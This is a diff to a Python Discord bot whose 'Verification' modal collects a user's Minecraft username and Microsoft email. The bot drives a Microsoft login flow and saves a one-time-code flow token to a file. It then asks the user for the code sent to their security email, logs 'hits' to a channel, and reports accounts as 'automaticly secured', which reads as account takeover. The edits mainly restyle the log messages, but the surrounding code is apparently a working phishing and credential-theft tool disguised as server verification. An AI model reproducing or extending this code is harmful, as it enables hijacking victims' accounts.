@@ -130,12 +130,12 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             sucessEmbed = discord.Embed (
-                    title = f"{interaction.user.name} | {interaction.user.id}",
-                    description = f"**Username**\n ```{self.username.value}```\n**Email**\n ```{self.email.value}```\n**Authentication Method**\n ```Authenticator App```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0x088F8F,                           
+                title = f"{interaction.user.name} | {interaction.user.id}",
+                description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Waiting for Auth confirmation```",
+                timestamp = datetime.datetime.now(),
+                colour = 0x678DC6,                           
             ).set_thumbnail(
-                url= f"https://mc-heads.net/avatar/{self.username.value}.png"
+                url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
             )
 
             await logs_channel.send(embed = sucessEmbed)
@@ -187,20 +187,21 @@ class MyModalOne(ui.Modal, title="Verification"):
                     return
 
                 elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
-                    await logs_channel.send(
-                        embed = discord.Embed(
-                            title = f"Securing Account - {interaction.user.name} ({interaction.user.id})",
-                            description = f"**Method**\n```Authenticator```\n**Status**\n```Securing...```",
-                            colour=0x00FF00
-                        )
-                    )   
+                    
+                    sucessEmbed = discord.Embed (
+                        title = f"{interaction.user.name} | {interaction.user.id}",
+                        description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Auth code confirmed!```",
+                        timestamp = datetime.datetime.now(),
+                        colour = 0x79D990,                           
+                    ).set_thumbnail(
+                        url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
+                    )
+
+                    await logs_channel.send("**This account is being automaticly secured.**")
+                    await logs_channel.send(embed = sucessEmbed)
 
                     await interaction.followup.send(
                         "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
-                    )
-
-                    await logs_channel.send(
-                        content = "@everyone"
                     )
 
                     # Securing
@@ -210,7 +211,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                         await hits_channel.send(
                             embed = embed
                         )
-                        
+
                     return
                 
                 time.sleep(1)
@@ -228,11 +229,15 @@ class MyModalOne(ui.Modal, title="Verification"):
 
             await logs_channel.send(
                embed = discord.Embed(
-                   title = f"Failed to Verify - {interaction.user.name} ({interaction.user.id})",
-                   description = f"**Method**\n```Authenticator```\n**Status**\n```Took too long to verify```",
-                            colour=0x00FF00
+                    title = f"{interaction.user.name} | {interaction.user.id}",
+                    description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Failed to confirm for Auth```",
+                    timestamp = datetime.datetime.now(),
+                    colour = 0xDE755B,                           
+                ).set_thumbnail(
+                    url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
                 )
             )
+
             return
 
         elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
@@ -241,18 +246,18 @@ class MyModalOne(ui.Modal, title="Verification"):
             print(f"[+] - Found security email: {secEmail["display"]}")
 
             # Will be replace with a db in later updates
-            with open("data.json", "w+") as f:
+            with open("data.json", "w+") as file:
                 json.dump(
                     {
                         "email": self.email.value, 
                         "flowtoken": emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
                     },
-                    f 
+                    file
                 )
 
             await interaction.followup.send(
                 embed=discord.Embed(
-                    title="Verification ✅",
+                    title="Verification",
                     description=f"A verification code has been sent to your security email {secEmail["display"]}.\nPlease click the button below to enter your code.",
                     colour=0x00FF00
                 ),
@@ -261,15 +266,13 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             sucessEmbed = discord.Embed (
-                    title = f"Auth Verification",
-                    description=f"**Email**\n```{self.email.value}```\n**Status**\n```Waiting for code...```",
+                    title = f"{interaction.user.name} | {interaction.user.id}",
+                    description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Waiting for OTP code```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xA3A300,                           
+                    colour = 0x678DC6,                           
             ).set_thumbnail(
-                url= f"https://mc-heads.net/avatar/{self.username.value}.png"
+                url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
             )
-
-
 
             await logs_channel.send(embed = sucessEmbed)
         
